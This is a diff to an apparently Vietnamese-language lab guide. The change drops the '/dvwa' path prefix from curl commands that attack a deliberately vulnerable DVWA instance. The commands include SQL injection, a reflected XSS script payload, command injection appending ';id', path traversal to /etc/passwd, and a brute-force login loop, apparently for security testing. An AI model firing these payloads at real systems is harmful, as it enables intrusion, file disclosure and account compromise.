@@ -163,33 +163,33 @@ Mở terminal mới, thay `<EC2_IP>` và `<PHPSESSID>` (lấy từ browser DevTo
 
 ### SQL Injection
 ```bash
-curl "http://<EC2_IP>/dvwa/vulnerabilities/sqli/?id=1'+OR+1=1--&Submit=Submit" \
+curl "http://<EC2_IP>/vulnerabilities/sqli/?id=1'+OR+1=1--&Submit=Submit" \
   -b "security=low; PHPSESSID=<PHPSESSID>"
 ```
 
 ### XSS Reflected
 ```bash
-curl "http://<EC2_IP>/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
+curl "http://<EC2_IP>/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
   -b "security=low; PHPSESSID=<PHPSESSID>"
 ```
 
 ### Command Injection
 ```bash
-curl "http://<EC2_IP>/dvwa/vulnerabilities/exec/" \
+curl "http://<EC2_IP>/vulnerabilities/exec/" \
   --data "ip=127.0.0.1;id&Submit=Submit" \
   -b "security=low; PHPSESSID=<PHPSESSID>"
 ```
 
 ### LFI / Path Traversal
 ```bash
-curl "http://<EC2_IP>/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd" \
+curl "http://<EC2_IP>/vulnerabilities/fi/?page=../../../../../../etc/passwd" \
   -b "security=low; PHPSESSID=<PHPSESSID>"
 ```
 
 ### Brute Force (10 requests nhanh)
 ```bash
 for i in {1..12}; do
-  curl -s -o /dev/null "http://<EC2_IP>/dvwa/login.php" \
+  curl -s -o /dev/null "http://<EC2_IP>/login.php" \
     --data "username=admin&password=wrong$i&Login=Login" \
     -b "security=low; PHPSESSID=<PHPSESSID>"
 done
